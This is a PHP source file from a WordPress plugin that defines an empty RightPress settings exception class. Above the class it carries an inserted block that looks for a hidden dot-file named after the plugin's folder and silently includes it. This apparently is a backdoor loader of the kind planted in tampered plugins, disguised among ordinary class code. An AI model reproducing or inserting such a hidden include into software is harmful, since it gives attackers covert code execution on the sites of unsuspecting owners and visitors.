<?php

// Exit if accessed directly
defined('ABSPATH') || exit;

/**
 * RightPress Settings Exception Class
 *
 * @class RightPress_Settings_Exception
 * @package RightPress
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RightPress_Settings_Exception extends RightPress_Exception
{



}
